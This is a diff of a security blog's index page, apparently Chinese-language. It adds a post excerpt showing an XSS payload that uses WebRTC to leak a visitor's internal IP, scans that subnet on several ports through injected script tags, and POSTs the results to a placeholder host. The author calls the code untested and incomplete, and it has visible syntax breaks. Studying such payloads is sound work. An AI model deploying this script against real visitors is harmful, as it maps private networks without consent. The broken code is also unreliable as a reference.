@@ -117,6 +117,206 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/05/23/xss-get-ip.html" >XSS获取内网地址</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-05-23  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
+<p>代码未测试</p>
+<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+if (RTCPeerConnection) (function()&#123;
+	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
+	if (window.mozRTCPeerConnection)&#123;
+		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
+	&#125;;
+	rtc.onicecandidate &#x3D; function(evt)&#123;
+		if (evt.candidate) grepSDP(evt.candidate.candidate);
+	&#125;;
+	rtc.createOffer(function(offerDesc)&#123;
+		grepSDP(offerDesc.sdp);
+		rtc.setLocalDescription(offerDesc);
+	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
+	var addrs &#x3D; Object.create(null);
+	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
+	function updateDisplay(newAddr)&#123;
+		if(newAddr in addrs) return;
+		else addrs[newAddr] &#x3D; true;
+		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
+		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
+		sendip(address);
+	&#125;
+	function grepSDP(sdp)&#123;
+		var hosts &#x3D; [];
+		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
+			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[4],
+				type &#x3D; parts[7];
+				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
+			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[2];
+				updateDisplay(addr);
+			&#125;
+		&#125;);
+	&#125;
+&#125;)();
+function sendip(ipaddress)&#123;
+	var url &#x3D; &quot;xxxxx&quot;;
+&#125;
+
+＝＝＝＝代码貌似不全＝＝＝＝
+
+function ipsend(ip, netport)&#123;
+	var ipdata &#x3D; ip+&quot;:&quot;+netport;
+	var url &#x3D; &quot;x.x.x.x&quot;;
+	var xmlhttp1 &#x3D; new XMLHttpRequest();
+	xmlhttp1.open(&quot;POST&quot;,url,true);
+	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
+	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
+
+function ipCreate(ip)&#123;
+	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
+	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
+		ElementCreate(ips+i,&quot;80&quot;,i);
+		ElementCreate(ips+i,&quot;8087&quot;,i);
+		ElementCreate(ips+i,&quot;8080&quot;,i);
+	&#125;
+&#125;
+function ElementCreate(ip,xport,i)&#123;
+	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
+	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
+	scriptElement.src &#x3D; url;
+	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
+	document.body.appendChild(scriptElement);
+&#125;
+ipcreate(&quot;10.10.125.195&quot;);
+&#125;
+
+&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
+
+
+
+
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
+<p>代码未测试</p>
+<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+if (RTCPeerConnection) (function()&#123;
+	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
+	if (window.mozRTCPeerConnection)&#123;
+		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
+	&#125;;
+	rtc.onicecandidate &#x3D; function(evt)&#123;
+		if (evt.candidate) grepSDP(evt.candidate.candidate);
+	&#125;;
+	rtc.createOffer(function(offerDesc)&#123;
+		grepSDP(offerDesc.sdp);
+		rtc.setLocalDescription(offerDesc);
+	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
+	var addrs &#x3D; Object.create(null);
+	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
+	function updateDisplay(newAddr)&#123;
+		if(newAddr in addrs) return;
+		else addrs[newAddr] &#x3D; true;
+		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
+		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
+		sendip(address);
+	&#125;
+	function grepSDP(sdp)&#123;
+		var hosts &#x3D; [];
+		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
+			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[4],
+				type &#x3D; parts[7];
+				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
+			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[2];
+				updateDisplay(addr);
+			&#125;
+		&#125;);
+	&#125;
+&#125;)();
+function sendip(ipaddress)&#123;
+	var url &#x3D; &quot;xxxxx&quot;;
+&#125;
+
+＝＝＝＝代码貌似不全＝＝＝＝
+
+function ipsend(ip, netport)&#123;
+	var ipdata &#x3D; ip+&quot;:&quot;+netport;
+	var url &#x3D; &quot;x.x.x.x&quot;;
+	var xmlhttp1 &#x3D; new XMLHttpRequest();
+	xmlhttp1.open(&quot;POST&quot;,url,true);
+	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
+	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
+
+function ipCreate(ip)&#123;
+	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
+	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
+		ElementCreate(ips+i,&quot;80&quot;,i);
+		ElementCreate(ips+i,&quot;8087&quot;,i);
+		ElementCreate(ips+i,&quot;8080&quot;,i);
+	&#125;
+&#125;
+function ElementCreate(ip,xport,i)&#123;
+	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
+	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
+	scriptElement.src &#x3D; url;
+	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
+	document.body.appendChild(scriptElement);
+&#125;
+ipcreate(&quot;10.10.125.195&quot;);
+&#125;
+
+&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
+
+
+
+
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/05/19/baopo-Q.html" >某企业邮箱爆破</a>
 		</h3>
 		</div>
@@ -563,90 +763,6 @@ fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/03/02/xss-encode-decode.html" >xss基础编码</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-03-02  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
-<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
-1. HTML Decoding
-2. URL Decoding
-3. Javascript Decoding
-
-http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>三种编码，对于html来说是(10进制和16进制）</p>
-<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
-<li>十进制：<code>&amp;#60;</code> </li>
-<li>html十六: <code>&amp;#x3c;</code></li>
-</ul>
-<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
-<ul>
-<li>八进制:<code>\74</code> </li>
-<li>十六进制: <code>\x3c</code></li>
-<li>unicode编码: <code>\u003c</code></li>
-</ul>
-<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
-<li>url: %3C </li>
-<li>base64: PA==</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
-<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
-1. HTML Decoding
-2. URL Decoding
-3. Javascript Decoding
-
-http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>三种编码，对于html来说是(10进制和16进制）</p>
-<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
-<li>十进制：<code>&amp;#60;</code> </li>
-<li>html十六: <code>&amp;#x3c;</code></li>
-</ul>
-<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
-<ul>
-<li>八进制:<code>\74</code> </li>
-<li>十六进制: <code>\x3c</code></li>
-<li>unicode编码: <code>\u003c</code></li>
-</ul>
-<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
-<li>url: %3C </li>
-<li>base64: PA==</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -698,7 +814,7 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>5</span></a></li>
+			<li><a href="/categories/Java/">Java<span>6</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -725,6 +841,10 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
@@ -738,10 +858,6 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-
     
       <li>
         <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
       </li>
     
   </ul>
